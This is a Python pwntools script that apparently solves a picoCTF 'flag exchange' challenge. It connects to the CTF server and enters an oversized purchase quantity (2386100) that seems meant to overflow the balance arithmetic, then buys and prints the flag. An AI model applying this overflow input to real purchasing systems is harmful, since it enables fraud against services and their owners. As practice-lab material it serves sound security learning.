from pwn import *

r = remote("fickle-tempest.picoctf.net" , 51080)
x = b"2386100"

for i in range(1):
    r.recvuntil(b" Enter a menu selection")
    r.sendline(b"2")
    
    r.recvuntil(b"2. 1337 Flag")
    r.sendline(b"1")

    r.recvuntil(b"These knockoff Flags cost 900 each, enter desired quantity")
    r.sendline(x)

r.recvuntil(b" Enter a menu selection")
r.sendline(b"1")

print(r.recvuntil(b"Welcome to the flag exchange"))

r.recvuntil(b" Enter a menu selection")
r.sendline(b"2")

r.recvuntil(b"2. 1337 Flag")
r.sendline(b"2")
r.sendline(b"1")

r.recvuntil(b"Enter 1 to buy oneYOUR FLAG IS:")
print(r.recvline())
r.interactive()
